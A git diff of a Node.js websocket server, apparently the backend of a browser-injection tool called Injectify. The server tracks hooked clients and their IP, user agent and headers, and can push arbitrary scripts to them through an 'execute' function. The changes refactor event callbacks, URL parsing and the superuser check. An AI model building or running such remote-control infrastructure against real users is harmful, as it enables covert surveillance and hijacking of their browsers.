@@ -1004,11 +1004,17 @@ MongoClient.connect(config.mongodb, function (err, db) {
             if (!inject.watchers[injectWatcher]) inject.watchers[injectWatcher] = []
             inject.watchers[injectWatcher].push({
               id: socket.id,
-              callback: () => {
-                socket.emit('inject:clients', inject.clients[injectWatcher])
+              callback: (event, client) => {
+                socket.emit('inject:clients', {
+                  event: event,
+                  client: client
+                })
               }
             })
-            socket.emit('inject:clients', inject.clients[thisProject.doc['_id']])
+            socket.emit('inject:clients', {
+              event: 'list',
+              clients: inject.clients[thisProject.doc['_id']]
+            })
           }).catch(e => {
             console.log(e)
             socket.emit('err', {
@@ -1096,15 +1102,18 @@ MongoClient.connect(config.mongodb, function (err, db) {
       return new Promise((resolve, reject) => {
         let project = socket.url.split('?')
         let debug = false
-        project = project[project.length - 1]
-        if (project.charAt(0) === '$') {
-          project = project.substring(1)
-          debug = true
-        }
-        if (!project) {
+        try {
+          project = project[project.length - 1]
+          if (project.charAt(0) === '$') {
+            project = project.substring(1)
+            debug = true
+          }
+          if (!project) throw 'project'
+        } catch(e) {
           reject('websocket connection with invalid / missing project name, terminating')
           return
         }
+
         try {
           project = atob(project)
         } catch (e) {
@@ -1196,7 +1205,7 @@ MongoClient.connect(config.mongodb, function (err, db) {
           }
         }
       }
-      inject.clients[project.id].push({
+      var client = {
         id: data.id,
         debug: inDebug,
         'user-agent': agent,
@@ -1215,7 +1224,9 @@ MongoClient.connect(config.mongodb, function (err, db) {
         execute: script => {
           send('execute', script)
         }
-      })
+      }
+
+      inject.clients[project.id].push(client)
 
       /**
        * Callback to the Injectify users
@@ -1223,7 +1234,7 @@ MongoClient.connect(config.mongodb, function (err, db) {
       if (inject.watchers[project.id]) {
         setTimeout(() => {
           inject.watchers[project.id].forEach(watcher => {
-            watcher.callback()
+            watcher.callback('connect', client)
           })
         }, 0)
       }
@@ -1236,7 +1247,11 @@ MongoClient.connect(config.mongodb, function (err, db) {
       } else {
         var core = inject.core
       }
-      core = core.replace('client.ip', JSON.stringify(ip)).replace('client.agent', JSON.stringify(agent)).replace('client.headers', JSON.stringify(socket.headers))
+      core = core
+             .replace('client.ip', JSON.stringify(ip))
+             .replace('client.agent', JSON.stringify(agent))
+             .replace('client.headers', JSON.stringify(socket.headers))
+             .replace('client.connectTime', JSON.stringify(+new Date))
       send('core', core)
 
       /**
@@ -1304,7 +1319,7 @@ MongoClient.connect(config.mongodb, function (err, db) {
         if (inject.watchers[project.id]) {
           setTimeout(() => {
             inject.watchers[project.id].forEach(watcher => {
-              watcher.callback()
+              watcher.callback('disconnect', client)
             })
           }, 0)
         }  
@@ -1625,7 +1640,7 @@ MongoClient.connect(config.mongodb, function (err, db) {
           if (!error && response.statusCode === 200 && user.login) {
             db.collection('projects', (err, projects) => {
               if (err) throw err
-              if (user.id === 13242392) {
+              if (config.superusers.includes(user.id)) {
                 projects.findOne({
                   'name': name
                 }).then(doc => {
